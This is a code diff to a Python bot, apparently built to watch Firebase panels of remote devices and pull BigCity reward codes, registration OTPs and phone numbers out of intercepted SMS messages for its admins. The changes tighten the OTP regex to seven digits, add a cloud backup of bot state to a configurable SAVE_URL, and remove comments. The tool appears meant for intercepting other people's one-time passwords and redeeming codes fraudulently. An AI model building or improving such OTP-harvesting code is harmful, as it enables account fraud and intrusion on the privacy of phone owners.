@@ -1,5 +1,5 @@
 """
-BigCity Firebase Monitor Bot (AM/PM Time Fixed + Exact Number)
+BigCity Firebase Monitor Bot (Strict 7-Digit OTP + Cloud Backup)
 """
 import asyncio
 import json
@@ -9,6 +9,7 @@ import sys
 import time
 import logging
 import httpx
+import requests
 from datetime import datetime
 from pathlib import Path
 from urllib.parse import urlparse
@@ -30,10 +31,12 @@ logger = logging.getLogger(__name__)
 # ─── CONFIG ───────────────────────────────────────────────────────────────────
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 ADMIN_ID_ENV = os.environ.get("ADMIN_ID", "").strip()
+SAVE_URL = os.environ.get("SAVE_URL", "").strip().rstrip("/")
 
-STATE_FILE = Path(__file__).parent / "bot_state.json"
-ADMINS_FILE = Path(__file__).parent / "admins.json"
-PANELS_FILE = Path(__file__).parent / "panels.json"
+BASE_DIR = Path(__file__).parent
+STATE_FILE = BASE_DIR / "bot_state.json"
+ADMINS_FILE = BASE_DIR / "admins.json"
+PANELS_FILE = BASE_DIR / "panels.json"
 
 BOT_START_TIME = time.time()
 BASELINE_DELAY = 10
@@ -47,15 +50,27 @@ MONITOR_INTERVAL = 5
 
 active_watches = set()
 
-# ─── MESSAGE PATTERNS (BigCity only) ─────────────────────────────────────────
+# ─── MESSAGE PATTERNS (Strict 7-digit OTP) ───────────────────────────────────
 REWARD_PATTERN = re.compile(r"Reward\s*Code\s*(?:is|:)\s*([A-Z0-9]{6,20})", re.IGNORECASE)
-OTP_PATTERN    = re.compile(r"OTP\s*to\s*register\s*(?:is|:)\s*(\d{4,8})", re.IGNORECASE)
+OTP_PATTERN    = re.compile(r"OTP\s*to\s*register\s*(?:is|:)\s*(\d{7})", re.IGNORECASE) # <--- STRICT 7 DIGIT
 BIGCITY_HINT   = re.compile(r"big\s*city", re.IGNORECASE)
 PHONE_PATTERN  = re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b")
 
-# ─── DATA MANAGEMENT ──────────────────────────────────────────────────────────
+# ─── CLOUD DATA MANAGEMENT ───────────────────────────────────────────────────
 
 def load_json(path, default):
+    filename = path.name
+    if SAVE_URL:
+        try:
+            r = requests.get(f"{SAVE_URL}/bot_backup/{filename}", timeout=5)
+            if r.status_code == 200:
+                data = r.json()
+                if data:
+                    logger.info(f"Loaded {filename} from Cloud.")
+                    return data
+        except Exception as e:
+            logger.debug(f"Cloud load failed for {filename}: {e}")
+
     try:
         if path.exists():
             with open(path) as f:
@@ -65,6 +80,17 @@ def load_json(path, default):
     return default
 
 def save_json(path, data):
+    filename = path.name
+    if SAVE_URL:
+        try:
+            r = requests.put(f"{SAVE_URL}/bot_backup/{filename}", json=data, timeout=10)
+            if r.status_code == 200:
+                logger.info(f"Saved {filename} to Cloud.")
+            else:
+                logger.error(f"Cloud save failed: {r.status_code}")
+        except Exception as e:
+            logger.error(f"Cloud save exception: {e}")
+
     try:
         with open(path, "w") as f:
             json.dump(data, f, indent=2)
@@ -174,17 +200,14 @@ def clean_number(val: str) -> str:
 
 def _extract_number(d: dict) -> str:
     if not isinstance(d, dict): return ""
-    # 1. Direct fields
     for f in ("Phone Number", "phoneNumber", "phone", "number", "mobile"):
         if f in d and d[f]:
             cleaned = clean_number(d[f])
             if cleaned: return cleaned
-    # 2. Sim/SMS fields
     for f in ("Phone #1", "Phone_1", "phone1", "Phone #2", "Phone_2", "phone2", "sim_number"):
         if f in d and d[f]:
             cleaned = clean_number(d[f])
             if cleaned: return cleaned
-    # 3. Deep Nested Search
     for k, v in d.items():
         if isinstance(v, dict):
             res = _extract_number(v)
@@ -206,8 +229,6 @@ def get_msg_timestamp(md: dict) -> float:
         return (dt_str / 1000.0) if dt_str > 1e12 else float(dt_str)
 
     dt_str = str(dt_str).strip()
-
-    # 1. Parse "07-11-2026 | 08:25 am" ya "07-11-2026 | 08:25 pm"
     match = re.search(r'(\d{1,2}-\d{1,2}-\d{4})\s*\|\s*(\d{1,2}:\d{2}\s*[apAP][mM])', dt_str)
     if match:
         try:
@@ -217,7 +238,6 @@ def get_msg_timestamp(md: dict) -> float:
             return dt.timestamp()
         except Exception: pass
 
-    # 2. Parse without AM/PM (normal 24h format)
     match2 = re.search(r'(\d{1,2}-\d{1,2}-\d{4})\s*\|\s*(\d{1,2}:\d{2})', dt_str)
     if match2:
         try:
@@ -226,7 +246,6 @@ def get_msg_timestamp(md: dict) -> float:
             dt = datetime.strptime(f"{date_part} {time_part}", "%d-%m-%Y %H:%M")
             return dt.timestamp()
         except Exception: pass
-
     return 0.0
 
 async def fetch_online_devices(client, base, dev_node):
@@ -318,7 +337,6 @@ async def process_device(client, pk, pc, did, num, state, admins, app):
             if (time.time() - BOT_START_TIME) < BASELINE_DELAY or not IS_INITIALIZED:
                 state[key] = True; continue
             
-            # AM/PM TIMESTAMP CHECK
             msg_time = get_msg_timestamp(md)
             if msg_time > 0 and msg_time < BOT_START_TIME:
                 state[key] = True; continue
